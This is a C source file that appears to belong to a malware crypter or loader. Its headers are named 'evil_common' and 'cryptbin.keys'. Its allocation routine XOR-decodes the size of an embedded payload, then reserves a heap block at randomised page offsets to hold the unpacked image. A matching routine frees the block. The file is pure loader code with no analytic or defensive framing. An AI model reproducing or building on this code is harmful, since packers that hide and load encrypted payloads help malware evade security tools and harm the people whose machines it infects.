//@@@headers
#include "alloc_halloc.h"
#include "locate.h"
#include "evil_common.h" // ALIGN_UP
#include "dbg.h"
#include "../cryptbin.keys.h" // CRYPTBIN_KEY for CachedSizeOfImage
//@@@endheaders

//@@@zvars
DWORD alloc_CachedSizeOfImage;
PVOID alloc_hHeap;
PVOID alloc_lpHeapBlock;
DWORD alloc_dwBlockSize;
PVOID alloc_lpImage;
//@@@endzvars

// halloc is a conglomeration of heap-like allocation methods

// A1D -> dwProtect
SPRAYABLE_PROC(alloc) {
  //@@@proc /name alloc
  Z(alloc_CachedSizeOfImage) = *(DWORD*)((DWORD_PTR)Z(locate_paydata) + Z(locate_paydatalen) - 4);
  Z(alloc_CachedSizeOfImage) ^= CRYPTBIN_TAIL_XORKEY;

  // #PossibleImprovements
  // LocalAlloc, GlobalAlloc, malloc, calloc, etc.

  Z(alloc_hHeap) = GetProcessHeap();
  Z(alloc_dwBlockSize) = ALIGN_UP(Z(alloc_CachedSizeOfImage), PAGE_SIZE);
  Z(alloc_dwBlockSize) += PAGE_GRANULARITY*_fka(5,10);
  Z(alloc_lpHeapBlock) = HeapAlloc(Z(alloc_hHeap), 0, Z(alloc_dwBlockSize)); XASSERT(alloc_lpHeapBlock);
  Z(alloc_lpImage) = (PVOID)((DWORD_PTR)ALIGN_UP((DWORD_PTR)Z(alloc_lpHeapBlock), PAGE_GRANULARITY)); // first valid imagebase in block (aligned)
  Z(alloc_lpImage) = (PVOID)((DWORD_PTR)Z(alloc_lpImage) + PAGE_GRANULARITY*_fkb(0,4)); //4, not 5, because we need 1 reserved PAGE_GRANULARITY for recent ALIGN_UP

  CUR_RETD = 1;
  //@@@endproc
}

SPRAYABLE_PROC(dealloc) {
  //@@@proc /name dealloc
  HeapFree(Z(alloc_hHeap), 0, Z(alloc_lpHeapBlock));
  //@@@endproc
}




